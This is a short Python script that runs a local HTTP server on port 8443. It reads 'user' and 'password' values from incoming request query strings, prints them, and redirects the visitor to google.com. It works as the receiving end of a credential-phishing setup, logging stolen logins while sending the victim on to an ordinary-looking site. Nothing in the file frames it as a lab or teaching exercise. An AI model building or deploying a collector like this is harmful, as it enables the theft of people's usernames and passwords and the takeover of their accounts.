from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

host_name = "localhost"
port = 8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        queries = parse_qs(
            urlparse(self.path).query
        )
        print(f"Username {queries['user'][0]}, Password {queries['password'][0]}")
        self.send_response(300)
        self.send_header("Location","http://google.com")
        self.end_headers()

if __name__ == "__main__":
    web_server = HTTPServer((host_name, port), MyServer)
    print(f"server started: http://{host_name}:{port}")
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass
    
    web_server.close()
    print("Webserver eneded")